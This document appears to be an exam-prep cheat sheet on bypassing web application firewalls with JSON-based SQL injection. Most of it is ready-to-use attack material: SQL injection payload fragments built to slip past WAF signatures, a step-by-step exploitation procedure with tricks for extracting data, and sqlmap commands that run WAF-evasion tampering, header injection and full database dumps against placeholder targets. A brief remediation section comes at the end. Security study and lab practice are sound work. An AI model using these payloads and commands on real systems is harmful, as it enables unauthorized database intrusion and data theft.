### Introduction
Web Application Firewalls (WAFs) are the first line of defense, but **parser differentials** create bypass opportunities.  

**Affected WAFs** (at time of research): AWS, Cloudflare, F5, Palo Alto, Imperva.  

**Core Technique**: Use native **JSON syntax** supported by modern databases (PostgreSQL, MySQL, SQLite, etc.). Many WAFs failed to parse JSON-in-SQL contexts, allowing malicious payloads to reach the backend.

---

### 🧠 Core Concept (Memorize This)
- Classic payloads (`' OR 1=1 --`) → Blocked by WAF signatures.
- **JSON-wrapped payloads** → WAF misses the SQL keywords → Bypassed.
- Example true statements that can prefix/append SQLi:

**Common JSON Bypass Payload Fragments** (Add these creatively):
```sql
' OR JSON_LENGTH("{}") <= 8896 UNION SELECT @@version --
```
```sql
' AND '{"a":1}'::jsonb <@ '{"a":1,"b":2}'::jsonb --
```
```sql
JSON_EXTRACT('{"id":1}', '$.id') = 1 UNION SELECT ...
```
```sql
' OR (SELECT '{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f') = 7 --
```

**Payload Crafting Tip**: Prefix normal SQLi with valid JSON expressions that evaluate to `TRUE`.

---

### 🛠️ Step-by-Step Exploitation

1. **Identify Sink** — Parameter where input is concatenated into SQL.
2. **Apply JSON Wrapper** — Use above fragments.
3. **Handle Output Issues** (Memorize Table):

| Limitation           | Issue                          | Solution |
|----------------------|--------------------------------|----------|
| Integers Only        | Hard to extract strings        | `string_to_array` + ASCII |
| Random Row Order     | Data scrambled                 | `row_number()` + math encoding |
| Slow Exfiltration    | 1 char/row                     | **Byte-shifting** into BIGINT (pack 7-8 chars) |

### 🚀 SQLMap Commands (Directly from Zlatan's Post + Enhanced)

#### 1. Basic WAF Identification + Enumeration
```bash
sqlmap -u "https://target.com/vulnerable?id=1" \
  --identify-waf --random-agent -v 3 \
  --tamper="between,randomcase,space2comment" \
  --level=5 --risk=3 --dbs
```

#### 2. POST Request Example
```bash
sqlmap -u "https://target.com/login" \
  --data="userid=admin&passwd=admin" --method POST \
  --identify-waf --random-agent -v 3 \
  --tamper="between,randomcase,space2comment" \
  --level=5 --risk=3 --dbs
```

#### 3. Header-Based Injection (e.g., X-Forwarded-For)
```bash
sqlmap -u "https://target.com/" \
  --headers="X-Forwarded-For:1*" -p "X-Forwarded-For" \
  --level=5 --risk=3 \
  --tamper="space2comment,between,randomcase" \
  --technique="BEUST" --no-cast --random-agent \
  --drop-set-cookie --dbms=mysql --dbs
```

#### 4. JSON Body + High Aggression
```bash
sqlmap -r request.txt --json \
  --level=5 --risk=3 --random-agent \
  --tamper="between,randomcase,space2comment,equaltolike" \
  --technique=BEU --dump-all --threads=5 --batch
```

**Pro Tips for SQLMap (Exam + Lab Ready)**:
- `--proxy=http://127.0.0.1:8080` → Monitor via Burp.
- Add more tampers: `charencode, space2dash, randomcomments`
- Use `--dbms=postgresql` or `mysql` when known.
- `--flush-session` when changing tactics.
- For pure JSON evasion (historical): Custom tamper scripts from Team82/Clarity research.

### 🛡️ Remediation
- Update WAF signatures (most vendors patched JSON support).
- **Strongest Defense**: Parameterized queries + ORM in application code.
- Defense-in-Depth: WAF + Input Validation + Least Privilege.
